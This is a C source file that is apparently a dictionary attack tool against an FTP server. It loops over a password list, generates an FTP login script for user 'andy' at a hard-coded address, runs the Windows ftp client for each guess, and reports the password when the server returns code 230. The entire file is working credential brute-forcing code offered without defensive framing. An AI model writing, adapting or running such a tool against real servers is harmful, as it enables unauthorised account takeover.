#include <stdio.h>
#include <stdlib.h>

void CreatePassFile(char* ip,char* pass)
{
    FILE* fp2 = fopen("E:\\dev\\Cbase\\QT\\QT2\\a.txt","w");
    if(!fp2)
    {
        ferror("fopen error");
        return ;
    }
    fprintf(fp2,"open %s\nuser\nandy\n%sbye",ip,pass);
    fclose(fp2);
}

int main()
{
    char* ip = "192.168.100.100";
    char buf[1024];
    FILE* fp1 = fopen("E:\\dev\\Cbase\\QT\\QT2\\password.txt","r");
    if(!fp1)
    {
        ferror("fopen error");
        return -1;
    }
    char pass[20];
    while(!feof(fp1))
    {
    memset(pass,0,20);
    fgets(pass,20,fp1);
    //printf("Password=%s\n",pass);
    CreatePassFile(ip,pass);

    FILE* fp3 = _popen("ftp -n -s:E:\\dev\\Cbase\\QT\\QT2\\a.txt","r");
    if(!fp3)
    {
        ferror("fopen error");
        return -1;
    }

//    FILE* fp4 = fopen("E:\\dev\\Cbase\\QT\\QT2\\login.txt","w");
//    if(!fp4)
//    {
//        ferror("fopen error");
//        return -1;
//    }

    while(!feof(fp3))
    {
        memset(buf,0,1024);
        fgets(buf,1024,fp3);
        if(!strncmp("230",buf,3))
        {
            printf("成功\n");
            printf("密码结果为%s",pass);
            //break;
            exit(0);
        }
//        fputs(buf,fp4);
//        fflush(fp4);
    }
    _pclose(fp3);

    //fclose(fp4);
    }

    fclose(fp1);
    return 0;
}
